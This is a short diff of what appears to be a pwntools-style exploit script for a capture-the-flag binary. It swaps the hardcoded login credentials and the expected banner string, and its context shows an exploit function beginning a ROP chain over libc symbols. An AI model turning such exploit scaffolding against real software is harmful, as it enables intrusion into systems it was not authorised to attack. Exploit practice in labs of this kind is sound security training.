@@ -62,8 +62,8 @@ continue
 # Stripped:   No
 # Debuginfo:  Yes
 
-usr = "n1k0th3gr3@t"
-pwd = "cr1st1n@scks"
+usr = "j@k3th3gr3@t"
+pwd = "inn0c3nc3"
 
 
 def send_payload(
@@ -87,7 +87,7 @@ def send_payload(
 def exploit() -> bool:
     io = start()
 
-    io.recvuntil(b"-- N1k0")
+    io.recvuntil(b"-- j@k3")
 
     # start rop chain
     syms = ["puts", "printf", "read", "strncmp", "exit"]
